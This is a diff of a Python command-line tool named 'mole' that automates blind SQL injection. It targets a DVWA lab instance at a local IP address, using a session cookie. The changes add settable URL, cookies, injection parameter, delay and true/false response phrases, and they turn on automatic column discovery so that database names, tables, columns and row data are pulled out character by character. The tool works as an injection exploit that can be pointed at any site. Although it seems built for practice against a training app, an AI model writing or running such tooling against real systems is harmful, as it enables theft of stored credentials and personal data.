@@ -6,6 +6,7 @@ from pynput.keyboard import Key, Listener
 from threading import Thread
 from termcolor import colored
 
+target = "id"
 table_list = {}
 exit = 0
 delay = 10
@@ -13,13 +14,13 @@ stop = False
 database_list = []
 all_data_list = {}
 r = requests.Session()
-url="http://192.168.1.26:8080/dvwa/vulnerabilities/sqli_blind/"
+url="http://192.168.1.29:8080/dvwa/vulnerabilities/sqli_blind/"
 data = {
     'id': "1",
     'Submit': 'Submit'
     }
 cookies = {
-    'PHPSESSID': 'm17755srpd9b5jcc8712sivlbr',
+    'PHPSESSID': 'a9rceqd4s8tjgq3cebvi9ttmdb',
     'security': 'low'
     }
 pass_phrase = 'User ID exists in the database.'
@@ -60,17 +61,20 @@ def print_promp():
 
 def print_menu():
     menu = ("\n1)  set url {url}                           : Set url for the attack"+
-        "\n2)  set cookies {cookie1;cookie2}           : Set cookies"+
-        "\n3)  set params {param1;param2}              : Set request parameters"+
-        "\n4)  set delay {delay}                       : Set delay between every fetch"+
-        "\n5)  get databases                           : Fetch names of databases"+
-        "\n6)  show databases                          : List names of databases"+
-        "\n7)  get tables from {database}              : Fetch names of tables on selected database"+
-        "\n8)  show tables from {database}             : List names of tables on selected database"+
-        "\n7)  get data from {database}/{table}        : Fetch data of selected table and databases"+
-        "\n8)  show data from {database}/{table}       : List data of selected table and databases"+
-        "\n9)  help or ?                               : Display all commands"+
-        "\n10) exit                                    : Exit program")
+        "\n2)  set cookies {cookie1,cookie2}           : Set cookies"+
+        "\n3)  set target {target}                     : Set target parameter for the injection"+
+        "\n4)  set params {param1,param2}              : Set request parameters"+
+        "\n5)  set delay {delay}                       : Set delay between every fetch"+
+        "\n6)  set correct {phrase}                    : Set phrase for correct query"+
+        "\n7)  set incorrect {phrase}                  : Set phrase for incorrect query"+
+        "\n8)  get databases                           : Fetch names of databases"+
+        "\n9)  show databases                          : List names of databases"+
+        "\n10) get tables from {database}              : Fetch names of tables on selected database"+
+        "\n11) show tables from {database}             : List names of tables on selected database"+
+        "\n12) get data from {database}/{table}        : Fetch data of selected table and databases"+
+        "\n13) show data from {database}/{table}       : List data of selected table and databases"+
+        "\n14) help or ?                               : Display all commands"+
+        "\n15) exit                                    : Exit program")
 
     print(menu)
 
@@ -79,8 +83,6 @@ def print_help():
     print(help)
 
 def exit_mole():
-#    global exit
-#    exit = 1
     print("\nBye!\n")
     time.sleep(1)
     sys.exit()
@@ -91,7 +93,53 @@ def exit_mole():
 
 def execute_command(command):
 
-    if command.startswith("show data from "):
+    if command.startswith("set delay "):
+
+        global delay
+        delay = int(command.split("set delay ")[1])
+
+    elif command.startswith("set params "):
+
+        global data
+
+        prams = (command.split("set params ")[1]).split(",")
+        for i in range(len(prams)):
+            values = prams[i].split(":")
+            data[values[0]] = values[1]
+
+    elif command.startswith("set target "):
+
+        global target
+
+        target = command.split("set target ")[1]
+
+        data[target] = 1
+
+    elif command.startswith("set cookies "):
+
+        global cookies
+
+        ckies = (command.split("set cookies ")[1]).split(",")
+        for i in range(len(ckies)):
+            values = ckies[i].split(":")
+            cookies[values[0]] = values[1]
+
+    elif command.startswith("set incorrect "):
+
+        global deny_phrase
+        deny_phrase = command.split("set incorrect ")[1]
+
+    elif command.startswith("set correct "):
+
+        global pass_phrase
+        pass_phrase = command.split("set correct ")[1]
+
+    elif command.startswith("set url "):
+
+        global url
+        url = command.split("set url ")[1]
+
+    elif command.startswith("show data from "):
 
         selected_database_table = command.split("show data from ")[1]
         if "/" in selected_database_table:
@@ -113,12 +161,10 @@ def execute_command(command):
             selected_database = selected_database_table.split("/")[0]
             selected_table = selected_database_table.split("/")[1]
 
-            #column_list = get_data_columns(selected_database, selected_table)
-            column_list = ['id', 'login', 'password', 'email', 'secret', 'activation_code', 'activated', 'reset_code', 'admin']
-
-            #print(column_list)
-
+            column_list = get_data_columns(selected_database, selected_table)
+            start_listener()
             get_data(selected_database, selected_table, column_list)
+            stop_listener()
 
         else:
             print("\nWrong syntax!")
@@ -163,9 +209,6 @@ def execute_command(command):
 # ------------------------------ Data ------------------------------
 
 def show_databases(selected_database, selected_table):
-    #print("")
-    #for i in range(len(database_list)):
-    #    print(str(i+1)+") "+database_list[i])
     print(all_data_list[selected_database+"/"+selected_table])
 
 def get_data_char(selected_database, selected_table, column, data_, char):
@@ -213,8 +256,6 @@ def get_data_num_char(selected_database, selected_table, column, data_):
 
         response = r.get(url, params=data, cookies=cookies).text
 
-        #print(response)
-
         if pass_phrase in response:
             break
         elif deny_phrase in response:
@@ -252,8 +293,6 @@ def get_num_data(selected_database, selected_table, column):
 
 def get_data(selected_database, selected_table, column_list):
 
-    #status = check_options()
-
     global all_data_list
     all_data_list[selected_database+"/"+selected_table] = []
     data_list = {}
@@ -280,7 +319,7 @@ def get_data(selected_database, selected_table, column_list):
                 data_list[column].append(data_name)
                 time.sleep(delay)
                 print(str(index)+") "+data_name)
-        #all_data_list[selected_database+"\"+selected_table].append(data_list[column])
+        all_data_list[selected_database+"/"+selected_table].append(data_list[column])
     else:
         pass
 
@@ -370,9 +409,6 @@ def get_num_data_columns(selected_database, selected_table):
 
 def get_data_columns(selected_database, selected_table):
 
-    #status = check_options()
-
-    #global database_list
     data_column_list = []
 
     if 1==1:
@@ -389,7 +425,6 @@ def get_data_columns(selected_database, selected_table):
                 data_column_name = data_column_name + char
             data_column_list.append(data_column_name)
             time.sleep(delay)
-            #print(str(index)+") "+database_name)
         return data_column_list
     else:
         pass
@@ -487,8 +522,6 @@ def get_num_tables(selected_database):
     return num_tables
 
 def get_tables(selected_database):
-
-    #status = check_options()
 
     global table_list
     table_list[selected_database] = []
@@ -602,8 +635,6 @@ def get_num_databases():
 
 def get_databases():
 
-    #status = check_options()
-
     global database_list
     database_list = []
 
@@ -667,8 +698,6 @@ t = 0
 def main():
 
     print_promp()
-
-    #Thread(target=key_listener).start()
 
     while True:
         print(colored("\n mole", "red")+colored("-> ", "yellow"), end="")
